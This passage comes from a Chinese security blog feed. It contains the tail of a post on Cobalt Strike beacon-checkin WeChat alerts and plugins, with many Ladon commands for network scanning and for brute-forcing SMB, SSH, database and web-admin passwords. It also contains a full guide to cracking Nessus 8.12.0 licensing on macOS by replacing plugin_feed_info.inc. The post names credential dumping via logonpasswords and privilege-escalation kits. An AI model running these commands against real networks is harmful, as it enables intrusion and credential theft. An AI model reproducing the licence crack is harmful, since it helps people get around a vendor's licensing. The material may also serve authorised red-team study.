class="line">data=&#123;<span class="string">&quot;text&quot;</span>: title, <span class="string">&quot;desp&quot;</span>: content&#125;)</span><br></pre></td></tr></table></figure><blockquote><p><strong>这里加 Token随机数的原因是Server 酱一分钟内无法发送重复信息</strong></p></blockquote><h2 id="后台挂载脚本"><a href="#后台挂载脚本" class="headerlink" title="后台挂载脚本"></a>后台挂载脚本</h2><p><strong>把cna脚本添加到本地客户端后，如果beacon上线了，这个提醒的请求是从客户端发出的。可是如果网络有波动，断开了到teamserver的连接，就收不到通知了。</strong></p><p><strong>解决方法是使用 agscript 在服务器端运行cna文件，和挂载 CobaltStrike 一样，把 cna 脚本也挂载到后台：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine CS4.0]<span class="comment"># screen</span></span><br><span class="line">[root@Catherine CS4.0]<span class="comment"># ./agscript xx.xxx.xx.xxx 50022  user ServerChan/Cs_ServerChan.cna</span></span><br><span class="line">Initial Beacon Checkin: 2122252342 PID: 3488</span><br><span class="line">Sending server: python3 /root/Tools/CS4.0/SeverChan/ServerChan.py --computernam LINTSTAR82CF --internalip 10.211.55.5 --username lintstar</span><br></pre></td></tr></table></figure><p><strong>挂载后查看进程：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@Catherine ~]<span class="comment"># ps -a</span></span><br><span class="line">    PID TTY          TIME CMD</span><br><span class="line">1045504 pts/0    00:00:00 teamserver</span><br><span class="line">1045507 pts/0    00:00:12 java</span><br><span class="line">1049085 pts/4    00:00:00 bash</span><br><span class="line">1049086 pts/4    00:00:08 java</span><br><span class="line">1055932 pts/7    00:00:00 ps</span><br></pre></td></tr></table></figure><p><strong>这里 agscript 的用法为：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agscript [host] [port] [user] [pass] &lt;/path/to/file.cna&gt;</span><br></pre></td></tr></table></figure><ul><li>[host] # 服务器的 ip 地址。</li><li>[port] # cs 的端口号，启动 cs 时有显示。</li><li>[user] # 后台挂载脚本时连接到 teamserver 的用户名。</li><li>[pass] # 启动服务端 cs 时设置的密码。</li><li>[path] # cna 文件的路径。</li></ul><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><strong>手机微信通知效果：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121225310.png" alt="image-20201121225310631"></p><p><strong>查看详情：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121225825.png" alt="image-20201121225825118"></p><p><strong>Mac 端微信通知详情：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121225941.png" alt="image-20201121225941242"></p><hr><h1 id="CobaltStrike-插件"><a href="#CobaltStrike-插件" class="headerlink" title="CobaltStrike 插件"></a>CobaltStrike 插件</h1><p><strong>它们是几个.cna后缀脚本 ：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121231558.png" alt="image-20201121231558206"></p><p><strong>在脚本管理器中添加即可</strong></p><h2 id="AV-Query"><a href="#AV-Query" class="headerlink" title="AV_Query"></a>AV_Query</h2><p><strong>查杀毒软件</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121122917.png" alt="image-20201121122917749"></p><h2 id="credpocalypse-cna"><a href="#credpocalypse-cna" class="headerlink" title="credpocalypse.cna"></a>credpocalypse.cna</h2><p><strong>定时自动logonpasswords抓凭据</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121232202.png" alt="image-20201121232202266"></p><h2 id="logvis-cna"><a href="#logvis-cna" class="headerlink" title="logvis.cna"></a>logvis.cna</h2><p><strong>记录命令操作日志</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121233014.png" alt="image-20201121233014666"></p><h2 id="ElevateKit"><a href="#ElevateKit" class="headerlink" title="ElevateKit"></a>ElevateKit</h2><p><strong>Github 地址：<a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a></strong></p><p><strong>增加 CS 自带提权模块：</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201121233610.png" alt="image-20201121233610596"></p><h2 id="梼杌"><a href="#梼杌" class="headerlink" title="梼杌"></a>梼杌</h2><p><strong>基于cobalt strike平台的红队自动化框架</strong></p><p><strong>项目地址：<a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210330091900.png" alt="image-20210330091900611"></p><p><strong>功能不必多说 大保健级别</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20210330091953.png" alt="image-20210330091953285"></p><h2 id="Ladon-召唤神龙强化Cobalt-Strike"><a href="#Ladon-召唤神龙强化Cobalt-Strike" class="headerlink" title="Ladon - 召唤神龙强化Cobalt Strike"></a>Ladon - 召唤神龙强化Cobalt Strike</h2><p><strong>Ladon wiki：<a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></strong></p><p><strong>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。</strong></p><p><strong>Ladon for Cobalt Strike：<a href="https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122002949.png" alt="image-20201122002949439"></p><h3 id="右键扩展"><a href="#右键扩展" class="headerlink" title="右键扩展"></a>右键扩展</h3><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122002221.png" alt="image-20201122002221647"></p><h3 id="Beacon-执行命令"><a href="#Beacon-执行命令" class="headerlink" title="Beacon 执行命令"></a>Beacon 执行命令</h3><ul><li><strong>扫描存活主机 - Ladon 10.211.55.5/24 OnlineIP</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122000030.png" alt="image-20201122000030412"></p><ul><li><strong>多协议识别操作系统 - Ladon 10.211.55.5/24 OsScan</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122001006.png" alt="image-20201122001006184"></p><ul><li><strong>获取本机内网IP与外网IP - Ladon GetIP</strong></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201122000349.png" alt="image-20201122000349394"></p><h3 id="其他神通"><a href="#其他神通" class="headerlink" title="其他神通"></a>其他神通</h3><h4 id="资产扫描、指纹识别、服务识别、存活主机、端口扫描"><a href="#资产扫描、指纹识别、服务识别、存活主机、端口扫描" class="headerlink" title="资产扫描、指纹识别、服务识别、存活主机、端口扫描"></a>资产扫描、指纹识别、服务识别、存活主机、端口扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多协议探测存活主机 （IP、机器名、MAC地址、制造商）</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 OnlinePC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 OsScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 OnlineIP</span><br><span class="line"></span><br><span class="line"><span class="comment"># ICMP扫描存活主机</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 Ping</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 MS17010</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SMBGhost</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描Web信息/Http服务</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 WebScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描C段站点URL域名</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 UrlScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描C段站点URL域名</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SameWeb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描子域名、二级域名</span></span><br><span class="line"></span><br><span class="line">- Ladon baidu.com SubDomain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域名解析IP、主机名解析IP</span></span><br><span class="line"></span><br><span class="line">- Ladon baidu.com DomainIP</span><br><span class="line">- Ladon baidu.com HostIP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域内机器信息获取</span></span><br><span class="line"></span><br><span class="line">- Ladon AdiDnsDump 192.168.1.8 （Domain IP）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描C段端口、指定端口扫描</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 PortScan</span><br><span class="line">- Ladon 192.168.1.8 PortScan 80,445,3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描C段WEB以及CMS（75种Web指纹识别）</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 WhatCMS</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描思科设备</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 CiscoScan</span><br><span class="line">- Ladon http://192.168.1.8 CiscoScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）</span></span><br><span class="line"></span><br><span class="line">- Ladon EnumMssql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举网络共享资源 （域、存活IP、共享路径）</span></span><br><span class="line"></span><br><span class="line">- Ladon EnumShare</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描LDAP服务器</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 LdapScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描FTP服务器</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 FtpScan</span><br></pre></td></tr></table></figure><h4 id="暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆"><a href="#暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆" class="headerlink" title="暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆"></a>暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 445端口 SMB密码爆破(Windows)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SmbScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 135端口 Wmi密码爆破(Windowns)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 WmiScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3389端口 LDAP服务器、AD域密码爆破(Windows)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 LdapScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5985端口 Winrm密码爆破(Windowns)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 WinrmScan.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 445端口 SMB NTLM HASH爆破(Windows)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SmbHashScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 135端口 Wmi NTLM HASH爆破(Windows)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 WmiHashScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 22端口 SSH密码爆破(Linux)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SshScan</span><br><span class="line">- Ladon 192.168.1.8:22 SshScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1433端口 Mssql数据库密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 MssqlScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1521端口 Oracle数据库密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 OracleScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3306端口 Mysql数据库密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 MysqlScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7001端口 Weblogic后台密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon http://192.168.1.8:7001/console WeblogicScan</span><br><span class="line">- Ladon 192.168.1.8/24 WeblogicScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5900端口 VNC远程桌面密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 VncScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 21端口 Ftp服务器密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 FtpScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8080端口 Tomcat后台登陆密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 TomcatScan</span><br><span class="line">- Ladon http://192.168.1.8:8080/manage TomcatScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># Web端口 401基础认证密码爆破</span></span><br><span class="line"></span><br><span class="line">- Ladon http://192.168.1.8/login HttpBasicScan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 445端口 Impacket SMB密码爆破(Windowns)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 SmbScan.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 445端口 IPC密码爆破(Windowns)</span></span><br><span class="line"></span><br><span class="line">- Ladon 192.168.1.8/24 IpcScan.ini</span><br></pre></td></tr></table></figure><blockquote><p><strong>更多神通详见：<a href="https://github.com/k8gege/Aggressor/blob/master/README.md">https://github.com/k8gege/Aggressor/blob/master/README.md</a></strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;VPS&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CentOS 8&lt;/strong&gt;&lt;</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Python" scheme="https://www.lintstar.top/tags/Python/"/>
    
    <category term="CobaltStrike" scheme="https://www.lintstar.top/tags/CobaltStrike/"/>
    
    <category term="ServerChan" scheme="https://www.lintstar.top/tags/ServerChan/"/>
    
    <category term="Attack" scheme="https://www.lintstar.top/tags/Attack/"/>
    
    <category term="Ladon" scheme="https://www.lintstar.top/tags/Ladon/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 破解安装 Nessus 8.12.0</title>
    <link href="https://www.lintstar.top/2020/11/bddb12c0.html"/>
    <id>https://www.lintstar.top/2020/11/bddb12c0.html</id>
    <published>2020-11-05T02:55:03.000Z</published>
    <updated>2020-11-05T02:55:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MacOS-破解安装-Nessus-8-12-0"><a href="#MacOS-破解安装-Nessus-8-12-0" class="headerlink" title="MacOS 破解安装 Nessus 8.12.0"></a>MacOS 破解安装 Nessus 8.12.0</h1><p><strong>系统环境：macOS 10.15.7</strong></p><p><strong>Nessus 版本：8.12.0</strong></p><hr><h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><ol><li><strong>Nessus 官网：<a href="https://www.tenable.com/downloads/nessus">https://www.tenable.com/downloads/nessus</a> 下载后缀 <code>.dmg</code></strong></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029102551.png" alt="image-20201029102551281"></p><ol start="2"><li><p><strong>安装成功后的 Nessus 目录位于 <code>/Library/Nessus/</code></strong></p></li><li><p><strong>Nessus 默认地址为：<a href="https://127.0.0.1:8834/">https://127.0.0.1:8834/</a></strong></p></li><li><p><strong>安装完毕会自动打开浏览器，注意</strong>⚠️<strong>要选择 Managed Scanner</strong> </p></li><li><p><strong>然后在 Manageed by 下拉选择 Tenable.sc</strong> </p></li><li><p><strong>最后输入用户名和密码登录</strong></p></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029105048.png" alt="image-20201029105048389"></p><hr><h1 id="获取激活码"><a href="#获取激活码" class="headerlink" title="获取激活码"></a>获取激活码</h1><p><a href="https://zh-cn.tenable.com/products/nessus/activation-code?tns_redirect=true#nessus">https://zh-cn.tenable.com/products/nessus/activation-code?tns_redirect=true#nessus</a></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029100355.png" alt="image-20201029100355106"></p><p><strong>导入激活码 完成后进入设置页，激活成功，显示仅允许扫描16个IP</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029113858.png" alt="image-20201029113858602"></p><p><strong>然后访问 <a href="https://plugins.nessus.org/offline.php">https://plugins.nessus.org/offline.php</a> 以下载获取 all-2.0.tar.gz 和 nessus-fetch.rc 文件</strong></p><p><strong>这里需要输入挑战码和激活码</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029100515.png" alt="image-20201029100514989"></p><hr><h1 id="获取挑战码"><a href="#获取挑战码" class="headerlink" title="获取挑战码"></a>获取挑战码</h1><p><strong>终端运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Library/Nessus/run/sbin</span><br><span class="line">sudo ./nessuscli fetch --challenge</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029100442.png" alt="image-20201029100442069"></p><hr><h1 id="下载升级离线更新包"><a href="#下载升级离线更新包" class="headerlink" title="下载升级离线更新包"></a>下载升级离线更新包</h1><p><strong>下载较慢需要等待</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029103310.png" alt="image-20201029103310459"></p><blockquote><p><strong>记得下载 nessus-fetch.rc</strong></p></blockquote><p> <strong>下载好后终端运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Library/Nessus/run/sbin</span><br><span class="line">sudo ./nessuscli update ~/Downloads/all-2.0.tar.gz</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029103844.png" alt="image-20201029103844886"></p><p><strong>复制 nessus-fetch.rc 到 <code>/Library/Nessus/run/etc/nessus/nessus-fetch.rc</code></strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029104139.png" alt="image-20201029104139576"></p><hr><h1 id="重启-Nessus-服务"><a href="#重启-Nessus-服务" class="headerlink" title="重启 Nessus 服务"></a>重启 Nessus 服务</h1><p><strong>终端运行：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Library/Nessus/run/sbin</span><br><span class="line">sudo ./nessusd restart</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029104547.png" alt="image-20201029104547817"></p><p><strong>系统偏好设置中也可以重启</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029104734.png" alt="image-20201029104733982"></p><hr><h1 id="替换文件"><a href="#替换文件" class="headerlink" title="替换文件"></a>替换文件</h1><p><strong>新建一个 plugin_feed_info.inc 文件内容如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PLUGIN_SET = <span class="string">&quot;202010191623&quot;</span>;</span><br><span class="line">PLUGIN_FEED = <span class="string">&quot;ProfessionalFeed (Direct)&quot;</span>;</span><br><span class="line"></span><br><span class="line">PLUGIN_FEED_TRANSPORT = <span class="string">&quot;Tenable Network Security Lightning&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>这里的数字串是上边更新 all-2.0.tar.gz 时 plugins 的 version</strong></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029110849.png" alt="image-20201029110849847"></p><p><strong>在下面目录替换 plugin_feed_info.inc 破解文件</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Library/Nessus/run/var/nessus/plugin_feed_info.inc </span><br></pre></td></tr></table></figure><p><strong>把下面目录的 plugin_feed_info.inc 删除</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Library/Nessus/run/lib/nessus/plugins/plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p><strong>修改用户、组和权限 (非必要)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root:admin ./plugin_feed_info.inc &amp;&amp; sudo chmod 644 ./plugin_feed_info.inc</span><br></pre></td></tr></table></figure><p><strong>重启 Nessus 等待初始化完成</strong></p><hr><h1 id="激活成功"><a href="#激活成功" class="headerlink" title="激活成功"></a>激活成功</h1><p><img src= "/img/loading.gif" data-lazy-src="https://qiniuyun.lintstar.top/hexo/20201029223210.png" alt="image-20201029223210200"></p><p><strong>不再有之前的 IP 限制</strong></p><p><strong><a href="https://sec.kim/wp-content/uploads/2020/10/Nessus-8.12.0-%E6%9C%80%E6%96%B0%E7%89%88%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95.pdf">Windows 下破解安装 Nessus_8.12.0</a></strong></p><hr><h1 id="破解原理"><a href="#破解原理" class="headerlink" title="破解原理"></a>破解原理</h1><ul><li><p><strong>新版本Nessus在检测到 lib/nessus/plugins 目录下有 plugin_feed_info.inc 文件，且内容与某些文件不匹配时，会清空plugins目录下的所有插件，导致即使破解了版本限制，也无法进行扫描。</strong></p></li><li><p><strong>而 var/nessus/plugin_feed_info.inc为破解内容时，lib/nessus/plugins/plugin_feed_info.inc 会直接复制 var/nessus/plugin_feed_info.inc 的内容，最终可绕过清空 plugins。</strong></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MacOS-破解安装-Nessus-8-12-0&quot;&gt;&lt;a href=&quot;#MacOS-破解安装-Nessus-8-12-0&quot; class=&quot;headerlink&quot; title=&quot;MacOS 破解安装 Nessus 8.12.0&quot;&gt;&lt;/a&gt;MacOS 破解安装 Nes</summary>
      
    
    
    
    <category term="Tools" scheme="https://www.lintstar.top/categories/Tools/"/>
    
    
    <category term="Mac" scheme="https://www.lintstar.top/tags/Mac/"/>
    
    <category term="Nessus" scheme="https://www.lintstar.top/tags/Nessus/"/>
    
  </entry>
  
</feed>
